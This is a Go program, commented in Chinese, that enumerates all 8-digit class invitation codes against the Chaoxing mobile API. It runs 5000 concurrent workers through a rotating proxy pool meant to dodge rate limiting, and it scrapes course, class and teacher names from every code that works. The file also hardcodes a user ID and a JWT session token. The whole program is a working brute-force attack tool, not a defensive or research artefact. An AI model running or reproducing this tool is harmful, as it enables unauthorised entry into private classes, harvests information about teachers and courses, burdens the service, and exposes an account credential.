package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	BaseURL  = "https://mooc1-api.chaoxing.com"
	Endpoint = "/teachingClassPhoneManage/phone/toParticipateCls"
	MobileUA = "Dalvik/2.1.0 (Linux; U; Android 16; 23054RA19C Build/BP2A.250605.031.A2)"

	Workers      = 5000
	BatchSize    = 2000
	ReqTimeout   = 5 * time.Second
	MaxRetries   = 1
	RetryDelay   = 300 * time.Millisecond
	SaveInterval = 500
	ShowInterval = 1000
)

var cookies = []*http.Cookie{
	{Name: "_uid", Value: "414634672"},
	{Name: "UID", Value: "414634672"},
	{Name: "p_auth_token", Value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI0MTQ2MzQ2NzIiLCJsb2dpblRpbWUiOjE3NzU1NDE1MDczNDYsImV4cCI6MTc3NjE0NjMwN30.XGS3fUEeNTBVRRBTLKA3GEhGTRdjgawEK3NfzYH7vcI"},
}

type Result struct {
	Code        string `json:"code"`
	Status      int    `json:"status"`
	Length      int    `json:"length"`
	Title       string `json:"title"`
	Text        string `json:"text"`
	Category    string `json:"category"`
	CourseName  string `json:"courseName,omitempty"`
	ClassName   string `json:"className,omitempty"`
	TeacherName string `json:"teacherName,omitempty"`
}

type Progress struct {
	Tested   []string `json:"tested"`
	LastCode int      `json:"last_code"`
	LastTime string   `json:"last_time"`
}

type ResultsFile struct {
	Type    string   `json:"type"`
	Count   int      `json:"count"`
	Results []Result `json:"results"`
}

var (
	outputDir    string
	progressFile string
	usableFile   string
	expiredFile  string
	invalidFile  string
)

// ProxyPool 代理池
type ProxyPool struct {
	proxies []string
	mu      sync.RWMutex
	idx     int
}

// NewProxyPool 创建代理池
func NewProxyPool(proxies []string) *ProxyPool {
	return &ProxyPool{proxies: proxies}
}

// GetProxy 获取下一个代理
func (p *ProxyPool) GetProxy() string {
	if len(p.proxies) == 0 {
		return ""
	}
	p.mu.Lock()
	defer p.mu.Unlock()
	proxy := p.proxies[p.idx]
	p.idx = (p.idx + 1) % len(p.proxies)
	return proxy
}

// GetRandomProxy 随机获取代理
func (p *ProxyPool) GetRandomProxy() string {
	if len(p.proxies) == 0 {
		return ""
	}
	p.mu.RLock()
	defer p.mu.RUnlock()
	return p.proxies[rand.Intn(len(p.proxies))]
}

// LoadProxies 从文件加载代理列表
func LoadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

func init() {
	dir, _ := os.Getwd()
	outputDir = filepath.Join(dir, "results_8digit")
	os.MkdirAll(outputDir, 0755)
	progressFile = filepath.Join(outputDir, "progress.json")
	usableFile = filepath.Join(outputDir, "usable_codes.json")
	expiredFile = filepath.Join(outputDir, "expired_codes.json")
	invalidFile = filepath.Join(outputDir, "invalid_codes.json")
}

func loadProgress() (map[string]struct{}, int) {
	tested := make(map[string]struct{})
	data, err := os.ReadFile(progressFile)
	if err != nil {
		return tested, -1
	}
	var p Progress
	if json.Unmarshal(data, &p) == nil {
		for _, c := range p.Tested {
			tested[c] = struct{}{}
		}
	}
	return tested, p.LastCode
}

func saveProgress(tested map[string]struct{}, lastCode int) {
	list := make([]string, 0, len(tested))
	for c := range tested {
		list = append(list, c)
	}
	p := Progress{Tested: list, LastCode: lastCode, LastTime: time.Now().Format(time.RFC3339)}
	data, _ := json.Marshal(p)
	os.WriteFile(progressFile, data, 0644)
}

func saveResults(usable, expired, invalid []Result) {
	writeFile(usableFile, "usable", usable)
	writeFile(expiredFile, "expired", expired)
	writeFile(invalidFile, "invalid", invalid)
}

func writeFile(path, typ string, results []Result) {
	data, _ := json.MarshalIndent(ResultsFile{Type: typ, Count: len(results), Results: results}, "", "  ")
	os.WriteFile(path, data, 0644)
}

func loadResults(path string) []Result {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var rf ResultsFile
	if json.Unmarshal(data, &rf) != nil {
		return nil
	}
	return rf.Results
}

func classifyResponse(html string) string {
	title := extractTag(html, "title")
	text := ""
	if idx := strings.Index(html, `blankTips">`); idx != -1 {
		if end := strings.Index(html[idx:], "</p>"); end != -1 {
			text = html[idx+11 : idx+end]
		}
	}
	if strings.Contains(text, "过期") || strings.Contains(title, "过期") {
		return "expired"
	}
	for _, kw := range []string{"无效", "错误", "error", "不存在", "无法找到"} {
		if strings.Contains(strings.ToLower(text), kw) || strings.Contains(strings.ToLower(title), kw) {
			return "invalid"
		}
	}
	hasClass := false
	for _, kw := range []string{"班级名称", "课程名称", "加入班级", "clsName", "teacherName"} {
		if strings.Contains(html, kw) {
			hasClass = true
			break
		}
	}
	if len(html) > 5000 && (hasClass || strings.Contains(html, "<form")) {
		return "usable"
	}
	if len(html) < 3000 {
		return "invalid"
	}
	if len(html) > 8000 {
		return "usable"
	}
	return "invalid"
}

func extractTag(html, tag string) string {
	open := "<" + tag + ">"
	if idx := strings.Index(html, open); idx != -1 {
		close := "</" + tag + ">"
		if end := strings.Index(html[idx:], close); end != -1 {
			return strings.TrimSpace(html[idx+len(open) : idx+end])
		}
	}
	return ""
}

var (
	courseRe = regexp.MustCompile(`<h3[^>]*class="overhidden2"[^>]*>([^<]+)</h3>`)
	pRe      = regexp.MustCompile(`<p[^>]*class="overhidden2"[^>]*>([^<]+)</p>`)
)

func extractInfo(html string) (string, string, string) {
	var course, class, teacher string
	if m := courseRe.FindStringSubmatch(html); len(m) > 1 {
		course = strings.TrimSpace(m[1])
		for _, prefix := range []string{"课程名称：", "课程名称 "} {
			if idx := strings.Index(course, prefix); idx != -1 {
				course = course[idx+len(prefix):]
			}
		}
	}
	if matches := pRe.FindAllStringSubmatch(html, -1); len(matches) >= 1 {
		class = strings.TrimSpace(matches[0][1])
		for _, prefix := range []string{"1_课程名称：", "课程名称："} {
			class = strings.TrimPrefix(class, prefix)
		}
		if len(matches) >= 2 {
			teacher = strings.TrimSpace(matches[1][1])
		}
	}
	return course, class, teacher
}

func testCode(code string, client *http.Client, proxyPool *ProxyPool) Result {
	targetURL := fmt.Sprintf("%s%s?inviteCode=%s", BaseURL, Endpoint, code)
	for attempt := 0; attempt <= MaxRetries; attempt++ {
		req, _ := http.NewRequest("GET", targetURL, nil)
		req.Header.Set("User-Agent", MobileUA)
		for _, c := range cookies {
			req.AddCookie(c)
		}
		
		// 使用代理
		if proxyPool != nil {
			proxy := proxyPool.GetRandomProxy()
			if proxy != "" {
				proxyURL, err := url.Parse(proxy)
				if err == nil {
					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}
					proxyClient := &http.Client{Transport: transport, Timeout: ReqTimeout}
					resp, err := proxyClient.Do(req)
					if err != nil {
						if attempt < MaxRetries {
							time.Sleep(RetryDelay * time.Duration(1<<attempt))
							continue
						}
						return Result{Code: code, Category: "invalid"}
					}
					body, _ := io.ReadAll(resp.Body)
					resp.Body.Close()
					html := string(body)
					cat := classifyResponse(html)
					r := Result{
						Code: code, Status: resp.StatusCode, Length: len(html),
						Title: extractTag(html, "title"), Category: cat,
					}
					if idx := strings.Index(html, `blankTips">`); idx != -1 {
						if end := strings.Index(html[idx:], "</p>"); end != -1 {
							r.Text = html[idx+11 : idx+end]
						}
					}
					if cat == "usable" {
						r.CourseName, r.ClassName, r.TeacherName = extractInfo(html)
					}
					return r
				}
			}
		}
		
		resp, err := client.Do(req)
		if err != nil {
			if attempt < MaxRetries {
				time.Sleep(RetryDelay * time.Duration(1<<attempt))
				continue
			}
			return Result{Code: code, Category: "invalid"}
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		html := string(body)
		cat := classifyResponse(html)
		r := Result{
			Code: code, Status: resp.StatusCode, Length: len(html),
			Title: extractTag(html, "title"), Category: cat,
		}
		if idx := strings.Index(html, `blankTips">`); idx != -1 {
			if end := strings.Index(html[idx:], "</p>"); end != -1 {
				r.Text = html[idx+11 : idx+end]
			}
		}
		if cat == "usable" {
			r.CourseName, r.ClassName, r.TeacherName = extractInfo(html)
		}
		return r
	}
	return Result{Code: code, Category: "invalid"}
}

func main() {
	tested, lastCode := loadProgress()
	start := 10000000
	end := 99999999
	if lastCode >= start {
		start = lastCode + 1
		fmt.Printf("[INFO] 从断点恢复，已测试 %d 个\n", len(tested))
	}
	total := end - start + 1
	fmt.Printf("[INFO] 测试范围: %08d - %08d\n", start, end)
	fmt.Printf("[INFO] 并发数: %d\n", Workers)
	fmt.Printf("[INFO] 待测试: %d 个\n", total)
	fmt.Println(strings.Repeat("=", 70))

	usableCodes := loadResults(usableFile)
	expiredCodes := loadResults(expiredFile)
	invalidCodes := loadResults(invalidFile)

	// 共享 HTTP 客户端（连接池）
	transport := &http.Transport{
		MaxIdleConns:        Workers,
		MaxIdleConnsPerHost: Workers,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
	}
	client := &http.Client{Transport: transport, Timeout: ReqTimeout}

	// 加载代理池
	var proxyPool *ProxyPool
	proxies, err := LoadProxies("proxies.txt")
	if err == nil && len(proxies) > 0 {
		proxyPool = NewProxyPool(proxies)
		fmt.Printf("[INFO] 代理池已加载: %d 个代理\n", len(proxies))
	} else {
		fmt.Printf("[INFO] 未使用代理池\n")
	}

	// 初始化计数器，加上已加载的结果
	var count int64 = int64(len(usableCodes) + len(expiredCodes) + len(invalidCodes))
	var usableN, expiredN, invalidN int64 = int64(len(usableCodes)), int64(len(expiredCodes)), int64(len(invalidCodes))
	startTime := time.Now()

	var testedMu sync.RWMutex

	// 信号量控制并发
	sem := make(chan struct{}, Workers)
	var wg sync.WaitGroup

	// 结果收集（单协程，无需锁）
	type taskResult struct {
		code   string
		result Result
	}
	resultCh := make(chan taskResult, Workers*2)

	var collectWg sync.WaitGroup
	collectWg.Add(1)
	go func() {
		defer collectWg.Done()
		for tr := range resultCh {
			c := atomic.AddInt64(&count, 1)
			r := tr.result
			switch r.Category {
			case "usable":
				atomic.AddInt64(&usableN, 1)
				usableCodes = append(usableCodes, r)
				fmt.Printf("\n✅ 可用: %s | 课程: %s | 班级: %s | 教师: %s",
					r.Code, r.CourseName, r.ClassName, r.TeacherName)
			case "expired":
				atomic.AddInt64(&expiredN, 1)
				expiredCodes = append(expiredCodes, r)
			default:
				atomic.AddInt64(&invalidN, 1)
				invalidCodes = append(invalidCodes, r)
			}
			testedMu.Lock()
			tested[tr.code] = struct{}{}
			testedMu.Unlock()

			if c%ShowInterval == 0 {
				elapsed := time.Since(startTime).Seconds()
				speed := float64(c) / elapsed
				remaining := float64(total) - float64(c)
				eta := remaining / speed
				fmt.Printf("\r[%.0fs] %d/%d (%.2f%%) | %.0f个/秒 | ETA:%.0f分钟 | 可用:%d 过期:%d 无效:%d    ",
					elapsed, c, total, float64(c)/float64(total)*100, speed, eta/60,
					atomic.LoadInt64(&usableN), atomic.LoadInt64(&expiredN), atomic.LoadInt64(&invalidN))
			}

			if c%SaveInterval == 0 {
				codeInt := 0
				fmt.Sscanf(tr.code, "%d", &codeInt)
				testedMu.RLock()
				saveProgress(tested, codeInt)
				testedMu.RUnlock()
				saveResults(usableCodes, expiredCodes, invalidCodes)
			}
		}
	}()

	// 发送任务
	for i := start; i <= end; i++ {
		code := fmt.Sprintf("%08d", i)
		testedMu.RLock()
		_, ok := tested[code]
		testedMu.RUnlock()
		if ok {
			continue
		}
		sem <- struct{}{} // 获取信号量
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			defer func() { <-sem }()
			r := testCode(c, client, proxyPool)
			resultCh <- taskResult{code: c, result: r}
		}(code)
	}

	wg.Wait()
	close(resultCh)
	collectWg.Wait()

	totalTime := time.Since(startTime).Seconds()
	saveProgress(tested, end)
	saveResults(usableCodes, expiredCodes, invalidCodes)

	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Printf("[完成] 总测试: %d\n", atomic.LoadInt64(&count))
	fmt.Printf("[用时] %.1f秒 (%.1f分钟)\n", totalTime, totalTime/60)
	fmt.Printf("[速度] %.1f 个/秒\n", float64(atomic.LoadInt64(&count))/totalTime)
	fmt.Printf("[可用] %d 个\n", atomic.LoadInt64(&usableN))
	fmt.Printf("[过期] %d 个\n", atomic.LoadInt64(&expiredN))
	fmt.Printf("[无效] %d 个\n", atomic.LoadInt64(&invalidN))
}
